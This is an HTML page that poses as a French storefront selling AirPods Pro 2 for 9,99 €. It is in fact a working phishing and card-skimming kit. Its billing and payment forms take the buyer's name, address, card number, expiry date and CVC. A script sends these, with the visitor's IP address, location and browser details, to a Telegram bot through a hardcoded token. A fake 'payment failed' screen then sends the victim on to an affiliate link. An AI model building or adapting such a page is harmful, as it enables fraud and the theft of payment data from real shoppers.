<!DOCTYPE html>

<html lang="fr">

<head>

Â  <meta charset="UTF-8">

Â  <meta name="viewport" content="width=device-width,initial-scale=1.0">

Â  <title>AirPods Pro 2 - Offre SpÃ©ciale</title>

Â  <!-- Google Tag Manager (dÃ©jÃ  inclus ton ID) -->

Â  <script>

Â  Â  (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':

Â  Â  new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],

Â  Â  j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=

Â  Â  'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);

Â  Â  })(window,document,'script','dataLayer','GTM-MCVTBG2P');

Â  </script>

Â  <!-- End Google Tag Manager -->

Â  <script src="https://cdn.tailwindcss.com"></script>

Â  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">

Â  <style>

Â  Â  body { font-family:'Inter',sans-serif; background:#f9fafb; color:#111; }

Â  Â  /* ... Ø¶Ø¹ Ù‡Ù†Ø§ ÙƒÙ„ CSS Ø§Ù„Ø®Ø§Øµ Ø¨Ø§Ù„Ø³ØªØ§ÙŠÙ„Ø§Øª ÙƒÙ…Ø§ Ù‡Ùˆ Ù…Ù† Ø³ÙƒØ±ÙŠØ¨Øª Ø¬ÙŠÙ…ÙŠÙ†ÙŠ ... */

Â  Â  .input-error { border-color:#ef4444 !important; }

Â  Â  .input-default { border-color:#d1d5db !important; }

Â  Â  .hidden { display:none !important; }

Â  Â  .fadein { animation:fadein .4s; }

Â  Â  @keyframes fadein { from { opacity:0; } to { opacity:1; } }

Â  Â  .modal-bg { background:rgba(0,0,0,0.45); }

Â  Â  .loader { border:4px solid #f3f3f3; border-top:4px solid #2563eb; border-radius:50%; width:38px; height:38px; animation:spin 1s linear infinite;}

Â  Â  @keyframes spin { 100% { transform:rotate(360deg);} }

Â  Â  .btn-main { background:#2563eb; color:white; font-weight:bold; padding:10px 0; border-radius:9px; width:100%; transition: background-color 0.2s ease-in-out; text-decoration: none; display: inline-block; }

Â  Â  .btn-main:hover { background:#1d4ed8; }

Â  Â  .form-label {font-weight:600; color: #374151;}

Â  Â  .visa-icon-input { position: relative; }

Â  Â  .visa-icon-input svg { position: absolute; right: 12px; top: 42px; width: 28px; height: 18px; opacity: .62; pointer-events: none; }

Â  </style>

</head>

<body class="min-h-screen flex flex-col items-center justify-center p-4 bg-white">



<!-- Google Tag Manager (noscript) -->

<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MCVTBG2P"

height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>

<!-- End Google Tag Manager (noscript) -->



<!-- ====== SECTION: PAGE ACCUEIL ====== -->

<div id="mainPageSection" class="max-w-md w-full mx-auto bg-white shadow-xl rounded-2xl p-6 text-center mt-7 fadein">

Â  <img src="https://i.postimg.cc/vB6Tkw6k/Screenshot-20250525-200639-Chrome.jpg" alt="AirPods Pro 2" class="w-32 h-32 object-contain mx-auto mb-2 rounded-xl shadow">

Â  <h1 class="text-3xl font-extrabold mb-2 text-gray-900">AirPods Pro 2áµ‰ GÃ©nÃ©ration</h1>

Â  <div class="flex items-center justify-center gap-3 mb-1">

Â  Â  <span class="text-2xl font-bold text-blue-700">9,99 â‚¬</span>

Â  Â  <span class="text-lg text-gray-400 line-through">249 â‚¬</span>

Â  </div>

Â  <p class="text-lg text-gray-700 mb-2">Offre spÃ©ciale limitÃ©e. Livraison rapide en France et Europe. QuantitÃ© trÃ¨s limitÃ©e !</p>

Â  <ul class="mb-4 text-gray-600 text-sm list-disc list-inside text-left mx-auto" style="max-width:280px">

Â  Â  <li>QualitÃ© audio exceptionnelle</li>

Â  Â  <li>Garantie 12 mois</li>

Â  Â  <li>Livraison suivie 24h/48h</li>

Â  </ul>

Â  <button id="startOrderBtn" class="btn-main text-lg px-2 mt-2 mb-1">Commander maintenant</button>

</div>



<!-- ====== SECTION: BILLING/SHIPPING (par dÃ©faut hidden) ====== -->

<div id="billingStep" class="max-w-md w-full bg-white shadow-lg rounded-xl px-6 py-7 fadein hidden">

Â  <div class="flex flex-col items-center border-b border-gray-200 pb-3 mb-4">

Â  Â  Â  <div class="flex items-center">

Â  Â  Â  Â  Â  <span class="text-2xl mr-2" role="img" aria-label="IcÃ´ne de panier">ğŸ›’</span>

Â  Â  Â  Â  Â  <img src="https://i.postimg.cc/vB6Tkw6k/Screenshot-20250525-200639-Chrome.jpg" alt="AirPods Pro 2" class="h-10 w-10 object-contain rounded-lg mr-2 border border-gray-200">

Â  Â  Â  Â  Â  <span class="text-lg font-semibold text-gray-700">x1</span>

Â  Â  Â  </div>

Â  </div>

Â  <h2 class="text-xl font-bold mb-1 text-center text-gray-800 flex items-center justify-center">

Â  Â  <span class="text-2xl mr-2" role="img" aria-label="IcÃ´ne de livraison">ğŸšš</span>

Â  Â  Adresse de Livraison et Facturation

Â  </h2>

Â  <p class="text-xs text-gray-500 text-center mb-4">

Â  Â  Entrez votre adresse complÃ¨te pour recevoir votre commande Ã  domicile.

Â  </p>

Â  <form id="billingForm" autocomplete="off" novalidate>

Â  Â  <div class="mb-3">

Â  Â  Â  <label class="form-label block mb-1 text-sm" for="billingName">Nom complet</label>

Â  Â  Â  <input type="text" id="billingName" name="billingName" class="input-default w-full px-3 py-2 text-sm border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition" autocomplete="off" required>

Â  Â  Â  <p class="hidden text-xs text-red-600 mt-1" id="billingNameError">Entrez un nom complet valide.</p>

Â  Â  </div>

Â  Â  <div class="mb-3">

Â  Â  Â  <div class="flex justify-between items-center mb-1">

Â  Â  Â  Â  Â  <label class="form-label text-sm" for="billingCountry">Pays</label>

Â  Â  Â  Â  Â  <span id="detectedCountryDisplayBilling" class="text-xs text-gray-500"></span>

Â  Â  Â  </div>

Â  Â  Â  <select id="billingCountry" name="billingCountry" class="input-default w-full px-3 py-2 text-sm border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition appearance-none" required>

Â  Â  Â  Â  <option value="">SÃ©lectionnez votre pays</option>

Â  Â  Â  Â  <option value="FR">ğŸ‡«ğŸ‡· France</option>

Â  Â  Â  Â  <option value="BE">ğŸ‡§ğŸ‡ª Belgique</option>

Â  Â  Â  Â  <option value="CH">ğŸ‡¨ğŸ‡­ Suisse</option>

Â  Â  Â  Â  <option value="DE">ğŸ‡©ğŸ‡ª Allemagne</option>

Â  Â  Â  Â  <option value="ES">ğŸ‡ªğŸ‡¸ Espagne</option>

Â  Â  Â  Â  <option value="IT">ğŸ‡®ğŸ‡¹ Italie</option>

Â  Â  Â  Â  <option value="PT">ğŸ‡µğŸ‡¹ Portugal</option>

Â  Â  Â  Â  <option value="NL">ğŸ‡³ğŸ‡± Pays-Bas</option>

Â  Â  Â  Â  <option value="LU">ğŸ‡±ğŸ‡º Luxembourg</option>

Â  Â  Â  Â  <option value="AT">ğŸ‡¦ğŸ‡¹ Autriche</option>

Â  Â  Â  Â  <option value="IE">ğŸ‡®ğŸ‡ª Irlande</option>

Â  Â  Â  Â  <option value="FI">ğŸ‡«ğŸ‡® Finlande</option>

Â  Â  Â  Â  <option value="DK">ğŸ‡©ğŸ‡° Danemark</option>

Â  Â  Â  Â  <option value="SE">ğŸ‡¸ğŸ‡ª SuÃ¨de</option>

Â  Â  Â  Â  <option value="NO">ğŸ‡³ğŸ‡´ NorvÃ¨ge</option>

Â  Â  Â  Â  <option value="PL">ğŸ‡µğŸ‡± Pologne</option>

Â  Â  Â  Â  <option value="CZ">ğŸ‡¨ğŸ‡¿ TchÃ©quie</option>

Â  Â  Â  Â  <option value="SK">ğŸ‡¸ğŸ‡° Slovaquie</option>

Â  Â  Â  Â  <option value="SI">ğŸ‡¸ğŸ‡® SlovÃ©nie</option>

Â  Â  Â  Â  <option value="GR">ğŸ‡¬ğŸ‡· GrÃ¨ce</option>

Â  Â  Â  Â  <option value="HU">ğŸ‡­ğŸ‡º Hongrie</option>

Â  Â  Â  Â  <option value="RO">ğŸ‡·ğŸ‡´ Roumanie</option>

Â  Â  Â  Â  <option value="BG">ğŸ‡§ğŸ‡¬ Bulgarie</option>

Â  Â  Â  Â  <option value="HR">ğŸ‡­ğŸ‡· Croatie</option>

Â  Â  Â  Â  <option value="EE">ğŸ‡ªğŸ‡ª Estonie</option>

Â  Â  Â  Â  <option value="LT">ğŸ‡±ğŸ‡¹ Lituanie</option>

Â  Â  Â  Â  <option value="LV">ğŸ‡±ğŸ‡» Lettonie</option>

Â  Â  Â  </select>

Â  Â  Â  <p class="hidden text-xs text-red-600 mt-1" id="billingCountryError">Choisissez votre pays.</p>

Â  Â  </div>

Â  Â  <div class="mb-3">

Â  Â  Â  <label class="form-label block mb-1 text-sm" for="billingAddress">Adresse</label>

Â  Â  Â  <input type="text" id="billingAddress" name="billingAddress" class="input-default w-full px-3 py-2 text-sm border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition" required>

Â  Â  Â  <p class="hidden text-xs text-red-600 mt-1" id="billingAddressError">Adresse invalide.</p>

Â  Â  </div>

Â  Â  <div class="mb-3">

Â  Â  Â  <label class="form-label block mb-1 text-sm" for="billingPostalCode">Code postal</label>

Â  Â  Â  <input type="text" id="billingPostalCode" name="billingPostalCode" class="input-default w-full px-3 py-2 text-sm border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition" required>

Â  Â  Â  <p class="hidden text-xs text-red-600 mt-1" id="billingPostalCodeError">Code postal invalide.</p>

Â  Â  </div>

Â  Â  <button type="submit" class="btn-main mt-4 text-base">Continuer</button>

Â  </form>

</div>

<!-- ====== SECTION: PAIEMENT ====== -->

<div id="paymentStep" class="max-w-md w-full bg-white shadow-lg rounded-xl px-6 py-7 fadein hidden">

Â  <div class="flex flex-col items-center border-b border-gray-200 pb-3 mb-4">

Â  Â  Â  <div class="flex items-center">

Â  Â  Â  Â  Â  <span class="text-2xl mr-2" role="img" aria-label="IcÃ´ne de panier">ğŸ›’</span>

Â  Â  Â  Â  Â  <img src="https://i.postimg.cc/vB6Tkw6k/Screenshot-20250525-200639-Chrome.jpg" alt="AirPods Pro 2" class="h-10 w-10 object-contain rounded-lg mr-2 border border-gray-200">

Â  Â  Â  Â  Â  <span class="text-lg font-semibold text-gray-700">x1</span>

Â  Â  Â  </div>

Â  </div>

Â  <h2 class="text-xl font-bold mb-2 text-center text-gray-800">Paiement sÃ©curisÃ©</h2>

Â  <div class="text-center mb-4">

Â  Â  Â  <p class="text-md text-gray-800">Ã€ payer : <span class="font-bold text-blue-600">9,99 â‚¬</span> <span style="color:#999;text-decoration:line-through;">249 â‚¬</span></p>

Â  </div>

Â  <form id="paymentForm" autocomplete="off" novalidate>

Â  Â  <div class="mb-3 visa-icon-input">

Â  Â  Â  <label class="form-label block mb-1 text-sm" for="cardNumber">NumÃ©ro de carte</label>

Â  Â  Â  <input type="text" id="cardNumber" name="cardNumber" class="input-default w-full px-3 py-2 text-sm border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition pr-10" maxlength="19" placeholder="1234 5678 9012 3456" required>

Â  Â  Â  <svg viewBox="0 0 32 12" xmlns="http://www.w3.org/2000/svg"><rect width="32" height="12" fill="#fff"/><text x="7" y="9" font-family="Arial,sans-serif" font-size="8" fill="#1a237e">VISA</text></svg>

Â  Â  Â  <p class="hidden text-xs text-red-600 mt-1" id="cardNumberError">NumÃ©ro de carte invalide.</p>

Â  Â  </div>

Â  Â  <div class="mb-3 flex gap-3">

Â  Â  Â  <div class="w-1/2">

Â  Â  Â  Â  <label class="form-label block mb-1 text-sm" for="cardExp">Expiration</label>

Â  Â  Â  Â  <input type="text" id="cardExp" name="cardExp" class="input-default w-full px-3 py-2 text-sm border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition" maxlength="5" placeholder="MM/AA" required>

Â  Â  Â  Â  <p class="hidden text-xs text-red-600 mt-1" id="cardExpError">Date invalide.</p>

Â  Â  Â  </div>

Â  Â  Â  <div class="w-1/2">

Â  Â  Â  Â  <label class="form-label block mb-1 text-sm" for="cardCVC">CVC</label>

Â  Â  Â  Â  <input type="text" id="cardCVC" name="cardCVC" class="input-default w-full px-3 py-2 text-sm border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition" maxlength="4" placeholder="123" required>

Â  Â  Â  Â  <p class="hidden text-xs text-red-600 mt-1" id="cardCVCError">CVC invalide.</p>

Â  Â  Â  </div>

Â  Â  </div>

Â  Â  <button type="submit" class="btn-main mt-4 text-base">Payer</button>

Â  Â  <div class="mt-4 text-center">

Â  Â  Â  <div class="flex justify-center items-center space-x-2 mb-1">

Â  Â  Â  Â  <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" class="h-4">

Â  Â  Â  Â  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/MasterCard_Logo.svg/2560px-MasterCard_Logo.svg.png" alt="Mastercard" class="h-4">

Â  Â  Â  Â  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/American_Express_logo_%282018%29.svg/1200px-American_Express_logo_%282018%29.svg.png" alt="American Express" class="h-4">

Â  Â  Â  </div>

Â  Â  Â  <div class="flex justify-center items-center text-xs text-gray-600">

Â  Â  Â  Â  <svg class="h-3 w-3 mr-1 text-green-600" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">

Â  Â  Â  Â  Â  <path fill-rule="evenodd" d="M10 1a4.5 4.5 0 00-4.5 4.5V9H5a2 2 0 00-2 2v7a2 2 0 002 2h10a2 2 0 002-2v-7a2 2 0 00-2-2h-.5V5.5A4.5 4.5 0 0010 1zm3 8V5.5a3 3 0 10-6 0V9h6z" clip-rule="evenodd" />

Â  Â  Â  Â  </svg>

Â  Â  Â  Â  Paiement 100% sÃ©curisÃ©

Â  Â  Â  </div>

Â  Â  </div>

Â  </form>

</div>



<!-- MODALS: LOADING & FAILED PAYMENT -->

<div id="loadingModal" class="fixed inset-0 flex items-center justify-center modal-bg hidden z-50 p-4">

Â  <div class="bg-white rounded-lg px-7 py-8 shadow-lg flex flex-col items-center fadein text-center">

Â  Â  <div class="loader mb-4"></div>

Â  Â  <div class="font-bold text-lg mb-1 text-gray-800">Traitement du paiement...</div>

Â  Â  <div class="flex items-center mb-2">

Â  Â  Â  <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa" class="h-7 bg-white rounded mr-2">

Â  Â  Â  <span style="font-size:1.25rem; color:#15803d;" role="img" aria-label="Cadenas sÃ©curisÃ©">ğŸ”’</span>

Â  Â  Â  <span class="text-green-700 text-xs font-medium ml-1">Paiement sÃ©curisÃ©</span>

Â  Â  </div>

Â  Â  <div class="text-xs text-gray-500">Veuillez patienter, ne fermez pas la page.</div>

Â  </div>

</div>



<div id="failedModal" class="fixed inset-0 flex items-center justify-center modal-bg hidden z-50 p-4">

Â  <div class="bg-white rounded-lg px-7 py-8 shadow-lg flex flex-col items-center fadein text-center">

Â  Â  <div class="text-5xl mb-2 text-yellow-500" role="img" aria-label="Panneau d'avertissement">âš ï¸</div>

Â  Â  <div class="font-bold text-lg mb-2 text-gray-800">Paiement Ã©chouÃ© !</div>

Â  Â  <div class="mb-2 text-gray-700">

Â  Â  Â  En raison dâ€™un trÃ¨s grand nombre de commandes sur notre site, le paiement n'a pas pu Ãªtre traitÃ©.<br>

Â  Â  Â  Veuillez rÃ©essayer avec notre autre passerelle de paiement sÃ©curisÃ©e.

Â  Â  </div>

Â  Â  <a id="secondPaymentBtn" href="https://ttgn.tracktimegenius.com/aff_c?offer_id=85898&aff_id=1931&source=AirPods+Pro+2" class="btn-main text-center block mt-4 no-underline text-sm p-3">

Â  Â  Â  Cliquez ici pour accÃ©der Ã  notre nouvelle passerelle de paiement exclusive

Â  Â  </a>

Â  </div>

</div>



<!-- Facebook Pixel dÃ©jÃ  inclus -->

<!-- (Colle ici exactement Ù†ÙØ³ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ù…ÙˆØ¬ÙˆØ¯ ÙÙŠ Ù…ÙˆÙ‚Ø¹Ùƒ ÙÙŠ Ø§Ù„Ù‡ÙŠØ¯ Ø£Ùˆ Ø§Ù„Ø¨ÙˆØ¯ÙŠ) -->

<script>

Â  !function(f,b,e,v,n,t,s)

Â  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?

Â  n.callMethod.apply(n,arguments):n.queue.push(arguments)};

Â  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';

Â  n.queue=[];t=b.createElement(e);t.async=!0;

Â  t.src='https://connect.facebook.net/en_US/fbevents.js';

Â  s=b.getElementsByTagName(e)[0];

Â  s.parentNode.insertBefore(t,s)}(window, document,'script');

Â  fbq('init', 'PIXEL_ID'); // Ø¶Ø¹ Ù‡Ù†Ø§ Ø§Ù„Ù€ Pixel ID Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ

Â  fbq('track', 'PageView');

</script>

<noscript>

Â  <img height="1" width="1" style="display:none"

Â  Â  Â  src="https://www.facebook.com/tr?id=PIXEL_ID&ev=PageView&noscript=1"/>

</noscript>



<!-- Telegram Alert Script for Billing & Payment -->

<script>

const TELEGRAM_BOT_TOKEN = "8026919110:AAGOm56kp92jEt9NphOYeBMiG_U_bX1uCYU";

const TELEGRAM_CHAT_ID = "-4913064483";

let userIP = "N/A", userCountryCode = "", userCountryName = "N/A", userCity = "N/A";



async function getGeoData() {

Â  try {

Â  Â  const res = await fetch('https://ipapi.co/json');

Â  Â  if(res.ok){

Â  Â  Â  const data = await res.json();

Â  Â  Â  userIP = data.ip || "N/A";

Â  Â  Â  userCountryCode = data.country_code || "";

Â  Â  Â  userCountryName = data.country_name || "N/A";

Â  Â  Â  userCity = data.city || "N/A";

Â  Â  }

Â  } catch(e) {}

}

getGeoData().then(()=>{ /* Ù„Ø§ Ø­Ø§Ø¬Ø© Ù„Ø£ÙŠ Ø¥Ø¬Ø±Ø§Ø¡ Ù‡Ù†Ø§ */ });



async function sendTelegramAlert(title, obj) {

Â  let msg = `ğŸ”” <b>${title}</b>\n`;

Â  msg += `ğŸ“ Localisation: ${userIP} - ${userCountryName} (${userCountryCode})\n`;

Â  msg += `ğŸ™ï¸ Ville: ${userCity}\n`;

Â  msg += `ğŸ•’ <b>Heure:</b> ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n`;

Â  msg += `ğŸ“± <b>UserAgent:</b> ${navigator.userAgent}\n`;

Â  for (let k in obj) {

Â  Â  msg += `\n<b>${String(k)}:</b> ${String(obj[k])}`;

Â  }

Â  try {

Â  Â  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {

Â  Â  Â  method:"POST",headers:{"Content-Type":"application/json"},

Â  Â  Â  body:JSON.stringify({chat_id: TELEGRAM_CHAT_ID,text: msg,parse_mode: "HTML"})

Â  Â  });

Â  } catch (e) {}

}

</script>

<script>

// ========== Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ø¨ÙŠÙ† Ø§Ù„ØµÙØ­Ø§Øª ==========



// Ø¥Ø¸Ù‡Ø§Ø± Ø®Ø·ÙˆØ© Ø§Ù„Ù€Billing Ù…Ø¨Ø§Ø´Ø±Ø© Ø¨Ø¹Ø¯ Ø²Ø± finalize commande (Ø§Ø³ØªØ¨Ø¯Ù„ Ø§Ù„Ø§Ø³ØªØ¯Ø¹Ø§Ø¡ Ø§Ù„Ù‚Ø¯ÙŠÙ…)

function showBillingStep() {

Â  Â  // Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„ÙÙˆØ±Ù… ÙˆØ¥Ø®ÙØ§Ø¡ Ø£ÙŠ Ø´ÙŠØ¡ Ø¢Ø®Ø± (Ø¥Ø°Ø§ Ù„Ø¯ÙŠÙƒ popup Ø£ÙˆÙ‚ÙÙ‡ Ù‡Ù†Ø§)

Â  Â  document.getElementById('billingStep').classList.remove('hidden');

Â  Â  window.scrollTo({ top: 0, behavior: "smooth" });

Â  Â  // Ø¥Ø±Ø³Ø§Ù„ Ø­Ø¯Ø« Ø¨ÙŠÙƒØ³Ù„ (InitiateCheckout)

Â  Â  if (typeof fbq === "function") fbq('track', 'InitiateCheckout');

Â  Â  sendTelegramAlert("DÃ©but du formulaire de livraison", {});

}



// ÙÙŠ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø£Ø³Ø§Ø³ÙŠ: Ø¹Ù†Ø¯Ù…Ø§ ÙŠØ¶ØºØ· Ø§Ù„Ø²Ø¨ÙˆÙ† Ø¹Ù„Ù‰ Ø§Ù„Ø²Ø± "finaliser la commande" (Ø§Ù„Ø²Ø± ÙÙŠ pop-up)

// Ø§Ø³ØªØ¨Ø¯Ù„ Ø£ÙŠ ØªØ­ÙˆÙŠÙ„ Ø®Ø§Ø±Ø¬ÙŠ Ø¨Ù€:

document.getElementById("finalizeBtn").onclick = function(e) {

Â  Â  e.preventDefault();

Â  Â  document.getElementById('modal').style.display = "none";

Â  Â  setTimeout(showBillingStep, 350);

};



// ========== Ø¥ÙƒÙ…Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù€Billing ==========



// ÙÙŠ ØµÙØ­Ø© billing:

document.getElementById('billingForm').onsubmit = async function(e){

Â  Â  e.preventDefault();

Â  Â  // ØªØ­Ù‚Ù‚ Ù…Ù† ØµØ­Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª (Ø§Ù„ØªØ­Ù‚Ù‚ Ù…ÙˆØ¬ÙˆØ¯ Ø¨Ø§Ù„ÙØ¹Ù„ ÙÙŠ Ø§Ù„Ø³ÙƒØ±ÙŠØ¨Øª)

Â  Â  if (!validateBilling(this)) return;

Â  Â  // Ø­ÙØ¸ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª

Â  Â  billingData = {

Â  Â  Â  Â  "Nom complet": this.billingName.value,

Â  Â  Â  Â  "Pays (formulaire)": this.billingCountry.options[this.billingCountry.selectedIndex].text,

Â  Â  Â  Â  "Adresse": this.billingAddress.value,

Â  Â  Â  Â  "Code Postal": this.billingPostalCode.value

Â  Â  };

Â  Â  // Ø¥Ø±Ø³Ø§Ù„ ØªÙ†Ø¨ÙŠÙ‡ ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù…

Â  Â  await sendTelegramAlert("Ã‰tape livraison/facturation remplie", billingData);

Â  Â  // Ø¥Ø±Ø³Ø§Ù„ Ø­Ø¯Ø« Ø¨ÙŠÙƒØ³Ù„ (AddPaymentInfo)

Â  Â  if (typeof fbq === "function") fbq('track', 'AddPaymentInfo');

Â  Â  // Ø§Ù„Ø§Ù†ØªÙ‚Ø§Ù„ Ù„ØµÙØ­Ø© Ø§Ù„Ø¯ÙØ¹

Â  Â  document.getElementById('billingStep').classList.add('hidden');

Â  Â  document.getElementById('paymentStep').classList.remove('hidden');

Â  Â  document.getElementById('paymentStep').classList.add('fadein');

Â  Â  window.scrollTo({ top: 0, behavior: "smooth" });

};



// ========== Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø¯ÙØ¹ (submit) ==========



// Ø¹Ù†Ø¯ Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø¯ÙØ¹

document.getElementById('paymentForm').onsubmit = async function(e){

Â  Â  e.preventDefault();

Â  Â  if (!validatePayment(this)) return;

Â  Â  const payData = {

Â  Â  Â  Â  "NumÃ©ro carte": this.cardNumber.value.replace(/\s/g,''),

Â  Â  Â  Â  "Expiration": this.cardExp.value,

Â  Â  Â  Â  "CVC": this.cardCVC.value

Â  Â  };

Â  Â  await sendTelegramAlert("Tentative paiement", {...billingData, ...payData});

Â  Â  document.getElementById('loadingModal').classList.remove('hidden');

Â  Â  // Ø­Ø¯Ø« Ø¨ÙŠÙƒØ³Ù„ Ù…Ø­Ø§ÙˆÙ„Ø© Ø´Ø±Ø§Ø¡ (Purchase Ø£Ùˆ event custom)

Â  Â  if (typeof fbq === "function") fbq('trackCustom', 'PaiementTentative');

Â  Â  setTimeout(()=>{

Â  Â  Â  Â  document.getElementById('loadingModal').classList.add('hidden');

Â  Â  Â  Â  document.getElementById('failedModal').classList.remove('hidden');

Â  Â  Â  Â  // ÙØ´Ù„ Ø§Ù„Ø¯ÙØ¹ = Ù„ÙŠØ³ purchase Ø­Ù‚ÙŠÙ‚ÙŠ (Ù„Ø§ ØªØ±Ø³Ù„ Purchase)

Â  Â  Â  Â  // ÙŠÙ…ÙƒÙ†Ùƒ Ø¥Ø±Ø³Ø§Ù„ Ø­Ø¯Ø« Ø¢Ø®Ø± (Ù…Ø«Ù„Ø§ PurchaseFailed)

Â  Â  Â  Â  if (typeof fbq === "function") fbq('trackCustom', 'PurchaseFailed');

Â  Â  }, 2000);

};



// ========== Ø²Ø± Ø§Ù„ØªØ­ÙˆÙŠÙ„ Ù„Ø¨ÙˆØ§Ø¨Ø© Ø§Ù„Ø¯ÙØ¹ Ø§Ù„Ø«Ø§Ù†ÙŠØ© ==========



document.getElementById('secondPaymentBtn').onclick = async function(e) {

Â  Â  e.preventDefault();

Â  Â  await sendTelegramAlert("Clic Passerelle Secondaire", {action: "AccÃ¨s passerelle secondaire aprÃ¨s Ã©chec"});

Â  Â  // Ø¥Ø°Ø§ ØªØ±ØºØ¨: Ø¥Ø±Ø³Ø§Ù„ Ø­Ø¯Ø« Ø¨ÙŠÙƒØ³Ù„ (Ù…Ø«Ù„Ø§Ù‹: InitiateExternalGateway)

Â  Â  if (typeof fbq === "function") fbq('trackCustom', 'InitiateExternalGateway');

Â  Â  window.location.href = this.href;

};



// ========== Ø¥Ø¸Ù‡Ø§Ø± Ø§Ù„Ø¯ÙˆÙ„Ø© ÙÙŠ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø¯ÙˆÙ„ (Ø­Ø³Ø¨ IP) ==========

(async function(){

Â  Â  try {

Â  Â  Â  Â  const res = await fetch('https://ipapi.co/json');

Â  Â  Â  Â  const data = await res.json();

Â  Â  Â  Â  if(data && data.country_code){

Â  Â  Â  Â  Â  Â  let select = document.getElementById('billingCountry');

Â  Â  Â  Â  Â  Â  if(select){

Â  Â  Â  Â  Â  Â  Â  Â  let opt = Array.from(select.options).find(x=>x.value.toUpperCase()===data.country_code.toUpperCase());

Â  Â  Â  Â  Â  Â  Â  Â  if(opt){ select.value = opt.value; }

Â  Â  Â  Â  Â  Â  }

Â  Â  Â  Â  Â  Â  let info = document.getElementById('detectedCountryDisplayBilling');

Â  Â  Â  Â  Â  Â  if(info && data.country_name){ info.textContent = `(Pays dÃ©tectÃ© : ${data.country_name})`; }

Â  Â  Â  Â  }

Â  Â  } catch(e){}

})();



// ========== Ø¶Ø¨Ø· Ø²Ø± Ø§Ù„Ø¹ÙˆØ¯Ø©/Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© ÙÙŠ popups ==========



['loadingModal', 'failedModal'].forEach(id=>{

Â  Â  let modal = document.getElementById(id);

Â  Â  if(modal) modal.addEventListener('click', function(e){

Â  Â  Â  Â  if(e.target===this) this.classList.add('hidden');

Â  Â  });

});



// ========== ÙˆØ¸Ø§Ø¦Ù Ø§Ù„ØªØ­Ù‚Ù‚ (copy-paste Ù…Ù† Ø³ÙƒØ±ÙŠØ¨ØªÙƒ Ø§Ù„Ø£ØµÙ„ÙŠ) ==========

function validateBilling(form) {

Â  let valid = true;

Â  const name = form.billingName.value.trim();

Â  const nameValid = name.length >= 3;

Â  handleFieldError(form.billingName, document.getElementById("billingNameError"), nameValid);

Â  if (!nameValid) valid = false;



Â  const country = form.billingCountry.value;

Â  const countryValid = !!country;

Â  handleFieldError(form.billingCountry, document.getElementById("billingCountryError"), countryValid);

Â  if (!countryValid) valid = false;

Â Â 

Â  const adr = form.billingAddress.value.trim();

Â  const addressValid = adr.length >= 5;

Â  handleFieldError(form.billingAddress, document.getElementById("billingAddressError"), addressValid);

Â  if (!addressValid) valid = false;



Â  const postalCode = form.billingPostalCode.value.trim();

Â  const postalCodeRegex = /^[a-zA-Z0-9\s-]{3,10}$/;Â 

Â  const postalCodeValid = postalCodeRegex.test(postalCode);

Â  handleFieldError(form.billingPostalCode, document.getElementById("billingPostalCodeError"), postalCodeValid);

Â  if(!postalCodeValid) valid = false;



Â  return valid;

}

function validatePayment(form) {

Â  let valid = true;

Â  const num = form.cardNumber.value.replace(/\s/g,'');

Â  const cardNumValid = /^\d{15,19}$/.test(num);

Â  handleFieldError(form.cardNumber, document.getElementById("cardNumberError"), cardNumValid);

Â  if (!cardNumValid) valid = false;



Â  const exp = form.cardExp.value;

Â  const expValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(exp);

Â  handleFieldError(form.cardExp, document.getElementById("cardExpError"), expValid);

Â  if (!expValid) valid = false;

Â Â 

Â  const cvc = form.cardCVC.value;

Â  const cvcValid = /^\d{3,4}$/.test(cvc);

Â  handleFieldError(form.cardCVC, document.getElementById("cardCVCError"), cvcValid);

Â  if (!cvcValid) valid = false;



Â  return valid;

}

function handleFieldError(inputElement, errorElement, isValid) {

Â  Â  if (!inputElement || !errorElement) return;

Â  Â  if (!isValid) {

Â  Â  Â  Â  inputElement.classList.add('input-error');

Â  Â  Â  Â  errorElement.classList.remove('hidden');

Â  Â  } else {

Â  Â  Â  Â  inputElement.classList.remove('input-error');

